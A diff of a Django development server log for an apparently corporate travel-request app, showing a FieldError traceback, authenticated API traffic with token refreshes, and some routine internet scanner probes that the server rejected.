-    clone.query.add_annotation(annotation, alias, is_summary=False)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 988, in add_annotation
-    summarize=is_summary)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/aggregates.py", line 39, in resolve_expression
-    c = super().resolve_expression(query, allow_joins, reuse, summarize)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/expressions.py", line 597, in resolve_expression
-    c.source_expressions[pos] = arg.resolve_expression(query, allow_joins, reuse, summarize, for_save)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/expressions.py", line 509, in resolve_expression
-    return query.resolve_ref(self.name, allow_joins, reuse, summarize)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1570, in resolve_ref
-    join_info = self.setup_joins(field_list, self.get_meta(), self.get_initial_alias(), can_reuse=reuse)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1473, in setup_joins
-    names[:pivot], opts, allow_many, fail_on_missing=True,
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1389, in names_to_path
-    "Choices are: %s" % (name, ", ".join(available)))
-django.core.exceptions.FieldError: Cannot resolve keyword '2' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-ERROR|16/Mar/2021 18:07:47|basehttp|22139|140377456060160|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 500 23101
-INFO|16/Mar/2021 18:10:40|basehttp|22372|140423716706048|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 48
-INFO|16/Mar/2021 18:21:53|basehttp|22787|140558501365504|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 83
-WARNING|16/Mar/2021 19:01:29|log|24930|140170737211136|Unauthorized: /get_add/employee/
-WARNING|16/Mar/2021 19:01:29|basehttp|24930|140170737211136|"POST /get_add/employee/ HTTP/1.1" 401 183
-INFO|16/Mar/2021 19:02:06|basehttp|24930|140170737211136|"POST /get_add/employee/ HTTP/1.1" 201 1462
-INFO|16/Mar/2021 19:10:50|basehttp|24930|140170745603840|"OPTIONS /api/custom/login/ HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:10:55|basehttp|24930|140170745603840|"POST /api/custom/login/ HTTP/1.1" 200 463
-INFO|16/Mar/2021 19:10:55|basehttp|24930|140170745603840|"OPTIONS /emoloyeeinfo/ HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:11:05|basehttp|24930|140170745603840|"POST /emoloyeeinfo/ HTTP/1.1" 200 1368
-INFO|16/Mar/2021 19:11:05|basehttp|24930|140170745603840|"OPTIONS /get_post_notification/?email=raju01&org_id=ORG150866 HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:11:34|basehttp|24930|140170745603840|"GET /get_post_notification/?email=raju01&org_id=ORG150866 HTTP/1.1" 200 26478
-INFO|16/Mar/2021 19:16:12|basehttp|24930|140170745603840|"OPTIONS /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=raju01 HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:16:12|basehttp|24930|140170745603840|"OPTIONS /get_action_status/?module=T, HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:16:17|basehttp|24930|140170745603840|"GET /get_action_status/?module=T, HTTP/1.1" 200 1802
-INFO|16/Mar/2021 19:18:57|basehttp|24930|140170745603840|"OPTIONS /get_employee_passport/?emp_id=raju01 HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:18:57|basehttp|24930|140170745603840|"OPTIONS /get_active_currency/?status_type=Active HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:18:57|basehttp|24930|140170141624064|"OPTIONS /get_dial_code/?dial_code= HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:19:01|basehttp|24930|140170150016768|"GET /get_employee_passport/?emp_id=raju01 HTTP/1.1" 200 48
-INFO|16/Mar/2021 19:19:01|basehttp|24930|140170745603840|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 4811
-INFO|16/Mar/2021 19:19:01|basehttp|24930|140170141624064|"GET /get_dial_code/?dial_code= HTTP/1.1" 200 57033
-INFO|16/Mar/2021 19:19:05|basehttp|24930|140170745603840|"OPTIONS /get_project/?pid=pro&limit=15&org_id=ORG150866 HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:19:33|basehttp|24930|140170745603840|"GET /get_project/?pid=pro&limit=15&org_id=ORG150866 HTTP/1.1" 200 9510
-INFO|16/Mar/2021 19:19:40|basehttp|24930|140170745603840|"OPTIONS /get_city/?city=del HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:19:46|basehttp|24930|140170745603840|"GET /get_city/?city=del HTTP/1.1" 200 2027
-INFO|16/Mar/2021 19:19:50|basehttp|24930|140170745603840|"OPTIONS /get_perdiem/?country=United%20States HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:19:50|basehttp|24930|140170141624064|"OPTIONS /get_employee_visa/?emp_code_id=raju01&visa_country_id=United%20States&visa_type= HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:19:50|basehttp|24930|140170150016768|"OPTIONS /get_add/visa_purpose_list/?country_id=PHL HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:19:50|basehttp|24930|140170753996544|"OPTIONS /get_post_location/?country=United%20States&org_id=ORG150866 HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:19:50|basehttp|24930|140170133231360|"OPTIONS /emoloyeedependent/?employee=raju01&country=United%20States HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:19:54|basehttp|24930|140170150016768|"GET /get_add/visa_purpose_list/?country_id=PHL HTTP/1.1" 200 8278
-INFO|16/Mar/2021 19:19:54|basehttp|24930|140170745603840|"GET /get_perdiem/?country=United%20States HTTP/1.1" 200 604
-INFO|16/Mar/2021 19:19:54|basehttp|24930|140170133231360|"GET /get_post_location/?country=United%20States&org_id=ORG150866 HTTP/1.1" 200 838
-INFO|16/Mar/2021 19:19:54|basehttp|24930|140170141624064|"GET /get_employee_visa/?emp_code_id=raju01&visa_country_id=United%20States&visa_type= HTTP/1.1" 200 53
-INFO|16/Mar/2021 19:19:55|basehttp|24930|140170753996544|"GET /emoloyeedependent/?employee=raju01&country=United%20States HTTP/1.1" 200 43
-INFO|16/Mar/2021 19:20:00|basehttp|24930|140170753996544|"OPTIONS /get_employee_visa/?emp_code_id=raju01&visa_country_id=United%20States&visa_type=Business HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:20:00|basehttp|24930|140170141624064|"OPTIONS /get_post_country_policy/?days=7&country_code=United%20States HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:20:04|basehttp|24930|140170753996544|"GET /get_employee_visa/?emp_code_id=raju01&visa_country_id=United%20States&visa_type=Business HTTP/1.1" 200 53
-INFO|16/Mar/2021 19:20:05|basehttp|24930|140170141624064|"GET /get_post_country_policy/?days=7&country_code=United%20States HTTP/1.1" 200 78
-INFO|16/Mar/2021 19:20:32|basehttp|24930|140170141624064|"OPTIONS /get_currency_conversion/?from_currency=USD&to_currency=USD HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:20:33|basehttp|24930|140170753996544|"OPTIONS /get_add/travel_request/ HTTP/1.1" 200 0
-INFO|16/Mar/2021 19:20:36|basehttp|24930|140170141624064|"GET /get_currency_conversion/?from_currency=USD&to_currency=USD HTTP/1.1" 200 63
-INFO|16/Mar/2021 19:21:44|basehttp|24930|140170753996544|"POST /get_add/travel_request/ HTTP/1.1" 200 90
-INFO|16/Mar/2021 19:21:53|basehttp|24930|140170141624064|"GET /get_action_status/?module=T, HTTP/1.1" 200 1802
-INFO|16/Mar/2021 19:30:52|basehttp|24930|140170753996544|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 4811
-INFO|16/Mar/2021 19:30:52|basehttp|24930|140170141624064|"GET /get_employee_passport/?emp_id=raju01 HTTP/1.1" 200 48
-INFO|16/Mar/2021 19:30:52|basehttp|24930|140170133231360|"GET /get_dial_code/?dial_code= HTTP/1.1" 200 57033
-INFO|16/Mar/2021 19:31:25|basehttp|24930|140170133231360|"GET /get_project/?pid=pro&limit=15&org_id=ORG150866 HTTP/1.1" 200 9510
-INFO|16/Mar/2021 19:31:38|basehttp|24930|140170133231360|"GET /get_city/?city=del HTTP/1.1" 200 2027
-INFO|16/Mar/2021 19:31:45|basehttp|24930|140170141624064|"GET /get_add/visa_purpose_list/?country_id=PHL HTTP/1.1" 200 8278
-INFO|16/Mar/2021 19:31:45|basehttp|24930|140170133231360|"GET /get_perdiem/?country=United%20States HTTP/1.1" 200 604
-INFO|16/Mar/2021 19:31:45|basehttp|24930|140170753996544|"GET /get_employee_visa/?emp_code_id=raju01&visa_country_id=United%20States&visa_type= HTTP/1.1" 200 53
-INFO|16/Mar/2021 19:31:45|basehttp|24930|140170150016768|"GET /get_post_location/?country=United%20States&org_id=ORG150866 HTTP/1.1" 200 838
-INFO|16/Mar/2021 19:31:46|basehttp|24930|140170124576512|"GET /emoloyeedependent/?employee=raju01&country=United%20States HTTP/1.1" 200 43
-INFO|16/Mar/2021 19:31:55|basehttp|24930|140170124576512|"GET /get_employee_visa/?emp_code_id=raju01&visa_country_id=United%20States&visa_type=Business HTTP/1.1" 200 53
-INFO|16/Mar/2021 19:31:56|basehttp|24930|140170150016768|"GET /get_post_country_policy/?days=7&country_code=United%20States HTTP/1.1" 200 78
-INFO|16/Mar/2021 19:33:42|basehttp|24930|140170150016768|"GET /get_currency_conversion/?from_currency=USD&to_currency=USD HTTP/1.1" 200 63
-INFO|16/Mar/2021 19:35:01|basehttp|24930|140170150016768|"POST /get_add/travel_request/ HTTP/1.1" 200 90
-INFO|16/Mar/2021 19:35:10|basehttp|24930|140170124576512|"GET /get_action_status/?module=T, HTTP/1.1" 200 1802
-INFO|16/Mar/2021 19:39:02|basehttp|24930|140170124576512|"GET /get_employee_passport/?emp_id=raju01 HTTP/1.1" 200 48
-INFO|16/Mar/2021 19:39:02|basehttp|24930|140170150016768|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 4811
-INFO|16/Mar/2021 19:39:02|basehttp|24930|140170133231360|"GET /get_dial_code/?dial_code= HTTP/1.1" 200 57033
-INFO|16/Mar/2021 19:39:32|basehttp|24930|140170133231360|"GET /get_project/?pid=pro&limit=15&org_id=ORG150866 HTTP/1.1" 200 9510
-INFO|16/Mar/2021 19:39:42|basehttp|24930|140170133231360|"GET /get_city/?city=del HTTP/1.1" 200 2027
-INFO|16/Mar/2021 19:39:50|basehttp|24930|140170124576512|"GET /get_add/visa_purpose_list/?country_id=PHL HTTP/1.1" 200 8278
-INFO|16/Mar/2021 19:39:51|basehttp|24930|140170150016768|"GET /get_employee_visa/?emp_code_id=raju01&visa_country_id=United%20States&visa_type= HTTP/1.1" 200 53
-INFO|16/Mar/2021 19:39:51|basehttp|24930|140170753996544|"GET /get_post_location/?country=United%20States&org_id=ORG150866 HTTP/1.1" 200 838
-INFO|16/Mar/2021 19:39:51|basehttp|24930|140170133231360|"GET /get_perdiem/?country=United%20States HTTP/1.1" 200 604
-INFO|16/Mar/2021 19:39:51|basehttp|24930|140170141624064|"GET /emoloyeedependent/?employee=raju01&country=United%20States HTTP/1.1" 200 43
-INFO|16/Mar/2021 19:40:00|basehttp|24930|140170141624064|"GET /get_employee_visa/?emp_code_id=raju01&visa_country_id=United%20States&visa_type=Business HTTP/1.1" 200 53
-INFO|16/Mar/2021 19:40:00|basehttp|24930|140170133231360|"GET /get_post_country_policy/?days=7&country_code=United%20States HTTP/1.1" 200 78
-INFO|16/Mar/2021 19:40:20|basehttp|24930|140170133231360|"GET /get_currency_conversion/?from_currency=USD&to_currency=USD HTTP/1.1" 200 63
-INFO|16/Mar/2021 19:41:29|basehttp|24930|140170141624064|"POST /get_add/travel_request/ HTTP/1.1" 200 90
-INFO|16/Mar/2021 19:41:35|basehttp|24930|140170133231360|"GET /get_action_status/?module=T, HTTP/1.1" 200 1802
-INFO|16/Mar/2021 19:45:54|basehttp|24930|140170116183808|"POST /get_approve_reject_request_by_mail/ HTTP/1.1" 200 59
+WARNING|16/Mar/2021 19:52:48|log|28341|139906490238720|Unauthorized: /get_post_notification/
+WARNING|16/Mar/2021 19:52:48|basehttp|28341|139906490238720|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 183
+WARNING|16/Mar/2021 19:52:48|log|28341|139906490238720|Unauthorized: /get_travel_request_approver/
+WARNING|16/Mar/2021 19:52:48|log|28341|139906412181248|Unauthorized: /get_add/travel_request/
+WARNING|16/Mar/2021 19:52:48|basehttp|28341|139906490238720|"GET /get_travel_request_approver/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866 HTTP/1.1" 401 183
+WARNING|16/Mar/2021 19:52:48|log|28341|139906403788544|Unauthorized: /getemployee_passport_info/
+WARNING|16/Mar/2021 19:52:48|basehttp|28341|139906412181248|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 401 183
+WARNING|16/Mar/2021 19:52:48|log|28341|139906395395840|Unauthorized: /getemployee_visa_info/
+WARNING|16/Mar/2021 19:52:48|basehttp|28341|139906403788544|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 401 183
+WARNING|16/Mar/2021 19:52:48|log|28341|139906490238720|Unauthorized: /post_get_calender_event/
+WARNING|16/Mar/2021 19:52:48|basehttp|28341|139906395395840|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 401 183
+WARNING|16/Mar/2021 19:52:48|basehttp|28341|139906490238720|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 401 183
+INFO|16/Mar/2021 19:52:49|basehttp|28341|139906490238720|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|16/Mar/2021 19:52:49|log|28341|139906490238720|Unauthorized: /get_post_notification/
+WARNING|16/Mar/2021 19:52:49|basehttp|28341|139906490238720|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 183
+INFO|16/Mar/2021 19:52:49|basehttp|28341|139906395395840|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|16/Mar/2021 19:52:49|log|28341|139906403788544|Unauthorized: /get_travel_request_approver/
+WARNING|16/Mar/2021 19:52:49|basehttp|28341|139906403788544|"GET /get_travel_request_approver/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866 HTTP/1.1" 401 183
+WARNING|16/Mar/2021 19:52:49|log|28341|139906403788544|Unauthorized: /get_add/travel_request/
+INFO|16/Mar/2021 19:52:49|basehttp|28341|139906395395840|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|16/Mar/2021 19:52:49|basehttp|28341|139906403788544|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 401 183
+INFO|16/Mar/2021 19:52:49|basehttp|28341|139906403788544|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|16/Mar/2021 19:52:49|log|28341|139906403788544|Unauthorized: /getemployee_passport_info/
+WARNING|16/Mar/2021 19:52:49|log|28341|139906490238720|Unauthorized: /post_get_calender_event/
+INFO|16/Mar/2021 19:52:49|basehttp|28341|139906395395840|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|16/Mar/2021 19:52:49|basehttp|28341|139906403788544|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 401 183
+WARNING|16/Mar/2021 19:52:49|basehttp|28341|139906490238720|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 401 183
+WARNING|16/Mar/2021 19:52:49|log|28341|139906412181248|Unauthorized: /getemployee_visa_info/
+WARNING|16/Mar/2021 19:52:49|basehttp|28341|139906412181248|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 401 183
+INFO|16/Mar/2021 19:52:49|basehttp|28341|139906490238720|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+INFO|16/Mar/2021 19:52:50|basehttp|28341|139906490238720|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:50|basehttp|28341|139906490238720|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:50|basehttp|28341|139906412181248|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:50|basehttp|28341|139906403788544|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|16/Mar/2021 19:52:50|log|28341|139906403788544|Unauthorized: /get_post_notification/
+INFO|16/Mar/2021 19:52:50|basehttp|28341|139906490238720|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|16/Mar/2021 19:52:50|basehttp|28341|139906403788544|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 183
+WARNING|16/Mar/2021 19:52:50|log|28341|139906403788544|Unauthorized: /get_travel_request_approver/
+WARNING|16/Mar/2021 19:52:50|basehttp|28341|139906403788544|"GET /get_travel_request_approver/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866 HTTP/1.1" 401 183
+INFO|16/Mar/2021 19:52:50|basehttp|28341|139906403788544|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:50|basehttp|28341|139906403788544|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|16/Mar/2021 19:52:50|log|28341|139906490238720|Unauthorized: /get_add/travel_request/
+WARNING|16/Mar/2021 19:52:50|basehttp|28341|139906490238720|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 401 183
+INFO|16/Mar/2021 19:52:50|basehttp|28341|139906412181248|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:50|basehttp|28341|139906395395840|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:51|basehttp|28341|139906395395840|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|16/Mar/2021 19:52:51|log|28341|139906395395840|Unauthorized: /getemployee_passport_info/
+WARNING|16/Mar/2021 19:52:51|basehttp|28341|139906395395840|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 401 183
+WARNING|16/Mar/2021 19:52:51|log|28341|139906412181248|Unauthorized: /getemployee_visa_info/
+INFO|16/Mar/2021 19:52:51|basehttp|28341|139906395395840|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|16/Mar/2021 19:52:51|log|28341|139906403788544|Unauthorized: /post_get_calender_event/
+WARNING|16/Mar/2021 19:52:51|basehttp|28341|139906412181248|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 401 183
+INFO|16/Mar/2021 19:52:51|basehttp|28341|139906490238720|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|16/Mar/2021 19:52:51|basehttp|28341|139906403788544|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 401 183
+INFO|16/Mar/2021 19:52:51|basehttp|28341|139906403788544|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:51|basehttp|28341|139906490238720|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:51|basehttp|28341|139906395395840|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:52|basehttp|28341|139906412181248|"GET /get_travel_request_approver/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866 HTTP/1.1" 200 48
+INFO|16/Mar/2021 19:52:52|basehttp|28341|139906403788544|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 1760
+INFO|16/Mar/2021 19:52:52|basehttp|28341|139906403788544|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:52|basehttp|28341|139906412181248|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:52|basehttp|28341|139906403788544|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 798
+INFO|16/Mar/2021 19:52:52|basehttp|28341|139906403788544|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 1303
+INFO|16/Mar/2021 19:52:52|basehttp|28341|139906403788544|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|16/Mar/2021 19:52:52|basehttp|28341|139906403788544|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|16/Mar/2021 19:52:53|basehttp|28341|139906490238720|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 35206
+ERROR|16/Mar/2021 19:54:24|exception|28341|139906490238720|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|16/Mar/2021 19:54:24|log|28341|139906490238720|Bad Request: /manager/html
+WARNING|16/Mar/2021 19:54:24|basehttp|28341|139906490238720|"GET /manager/html HTTP/1.1" 400 62889
+INFO|16/Mar/2021 21:07:31|basehttp|28341|139906490238720|code 400, message Bad HTTP/0.9 request type ('\x00\x0e8\x15p¬T÷_Í')
+WARNING|16/Mar/2021 21:07:31|basehttp|28341|139906490238720|" 8p¬T÷_Í     " 400 -
+WARNING|16/Mar/2021 21:09:29|log|28341|139906490238720|Not Found: /tree
+WARNING|16/Mar/2021 21:09:29|basehttp|28341|139906490238720|"GET /tree? HTTP/1.1" 404 49666
+INFO|16/Mar/2021 21:16:42|basehttp|28341|139906490238720|code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+WARNING|16/Mar/2021 21:16:42|basehttp|28341|139906490238720|"  /*à     Cookie: mstshash=Administr" 400 -
+WARNING|16/Mar/2021 21:28:05|log|28341|139906490238720|Not Found: /tree
+WARNING|16/Mar/2021 21:28:05|basehttp|28341|139906490238720|"GET /tree? HTTP/1.1" 404 49666
+INFO|16/Mar/2021 21:35:47|basehttp|28341|139906490238720|code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+WARNING|16/Mar/2021 21:35:47|basehttp|28341|139906490238720|"  /*à     Cookie: mstshash=Administr" 400 -
+ERROR|16/Mar/2021 21:50:37|exception|28341|139906490238720|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|16/Mar/2021 21:50:37|log|28341|139906490238720|Bad Request: /manager/html
+WARNING|16/Mar/2021 21:50:37|basehttp|28341|139906490238720|"GET /manager/html HTTP/1.1" 400 62889
+ERROR|16/Mar/2021 21:50:37|basehttp|28341|139906490238720|"GET /manager/html HTTP/1.1" 500 59
+INFO|16/Mar/2021 22:17:55|basehttp|28341|139906490238720|"OPTIONS /api/custom/login/ HTTP/1.1" 200 0
+INFO|16/Mar/2021 22:17:56|basehttp|28341|139906490238720|"POST /api/custom/login/ HTTP/1.1" 200 455
+INFO|16/Mar/2021 22:17:57|basehttp|28341|139906490238720|"OPTIONS /emoloyeeinfo/ HTTP/1.1" 200 0
+INFO|16/Mar/2021 22:17:57|basehttp|28341|139906490238720|"POST /emoloyeeinfo/ HTTP/1.1" 200 1468
+INFO|16/Mar/2021 22:17:58|basehttp|28341|139906490238720|"OPTIONS /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|16/Mar/2021 22:17:58|basehttp|28341|139906490238720|"OPTIONS /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 0
+INFO|16/Mar/2021 22:17:58|basehttp|28341|139906403788544|"OPTIONS /get_travel_request_approver/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|16/Mar/2021 22:17:58|basehttp|28341|139906490238720|"OPTIONS /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 0
+INFO|16/Mar/2021 22:17:58|basehttp|28341|139906490238720|"OPTIONS /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 0
+INFO|16/Mar/2021 22:17:59|basehttp|28341|139906403788544|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 1760
+INFO|16/Mar/2021 22:18:00|basehttp|28341|139906490238720|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 35206
+INFO|16/Mar/2021 22:18:00|basehttp|28341|139906490238720|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 1303
+INFO|16/Mar/2021 22:18:00|basehttp|28341|139906403788544|"GET /get_travel_request_approver/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866 HTTP/1.1" 200 48
+INFO|16/Mar/2021 22:18:00|basehttp|28341|139906403788544|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|16/Mar/2021 22:18:00|basehttp|28341|139906412181248|"OPTIONS /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 0
+INFO|16/Mar/2021 22:18:01|basehttp|28341|139906412181248|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 798
+INFO|16/Mar/2021 22:18:11|basehttp|28341|139906412181248|"OPTIONS /get_employee_passport/?emp_id=div944 HTTP/1.1" 200 0
+INFO|16/Mar/2021 22:18:11|basehttp|28341|139906412181248|"OPTIONS /get_active_currency/?status_type=Active HTTP/1.1" 200 0
+INFO|16/Mar/2021 22:18:11|basehttp|28341|139906412181248|"OPTIONS /get_dial_code/?dial_code= HTTP/1.1" 200 0
+INFO|16/Mar/2021 22:18:11|basehttp|28341|139906412181248|"GET /get_employee_passport/?emp_id=div944 HTTP/1.1" 200 48
+INFO|16/Mar/2021 22:18:11|basehttp|28341|139906412181248|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 4811
+INFO|16/Mar/2021 22:18:12|basehttp|28341|139906403788544|"GET /get_dial_code/?dial_code= HTTP/1.1" 200 57033
+INFO|16/Mar/2021 22:18:45|basehttp|28341|139906412181248|"GET /get_travel_request_approver/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866 HTTP/1.1" 200 48
+INFO|16/Mar/2021 22:18:45|basehttp|28341|139906377303808|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|16/Mar/2021 22:18:45|basehttp|28341|139906395395840|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 798
+INFO|16/Mar/2021 22:18:45|basehttp|28341|139906490238720|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 1303
+INFO|16/Mar/2021 22:18:46|basehttp|28341|139906403788544|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 35206
+INFO|16/Mar/2021 22:42:42|basehttp|28341|139906490238720|"GET / HTTP/1.1" 200 44
+INFO|16/Mar/2021 22:50:39|basehttp|28341|139906490238720|"GET / HTTP/1.1" 200 44
+INFO|16/Mar/2021 23:23:42|basehttp|28341|139906490238720|"GET / HTTP/1.1" 200 44
+INFO|16/Mar/2021 23:23:52|basehttp|28341|139906490238720|"GET / HTTP/1.1" 200 44
+ERROR|16/Mar/2021 23:31:47|exception|28341|139906490238720|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|16/Mar/2021 23:31:47|log|28341|139906490238720|Bad Request: /manager/html
+WARNING|16/Mar/2021 23:31:47|basehttp|28341|139906490238720|"GET /manager/html HTTP/1.1" 400 62889
+WARNING|16/Mar/2021 23:49:21|log|28341|139906490238720|Not Found: /http:/www.bing.com/
+WARNING|16/Mar/2021 23:49:21|basehttp|28341|139906490238720|"GET http://www.bing.com/ HTTP/1.1" 404 1665
+INFO|16/Mar/2021 23:49:51|basehttp|28341|139906490238720|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|16/Mar/2021 23:49:51|basehttp|28341|139906490238720|" " 400 -
+INFO|16/Mar/2021 23:50:01|basehttp|28341|139906403788544|code 400, message Bad request syntax ('\x04\x01\x00PÌOÅÈ\x00')
+WARNING|16/Mar/2021 23:50:01|basehttp|28341|139906403788544|" PÌOÅÈ " 400 -
+WARNING|17/Mar/2021 00:37:55|log|28341|139906403788544|Not Found: /tree
+WARNING|17/Mar/2021 00:37:55|basehttp|28341|139906403788544|"GET /tree? HTTP/1.1" 404 49666
+ERROR|17/Mar/2021 01:34:18|exception|28341|139906403788544|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|17/Mar/2021 01:34:18|log|28341|139906403788544|Bad Request: /manager/html
+WARNING|17/Mar/2021 01:34:18|basehttp|28341|139906403788544|"GET /manager/html HTTP/1.1" 400 62889
+INFO|17/Mar/2021 01:42:54|basehttp|28341|139906403788544|"GET / HTTP/1.1" 200 39
+ERROR|17/Mar/2021 02:10:43|exception|28341|139906403788544|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|17/Mar/2021 02:10:43|log|28341|139906403788544|Bad Request: /manager/html
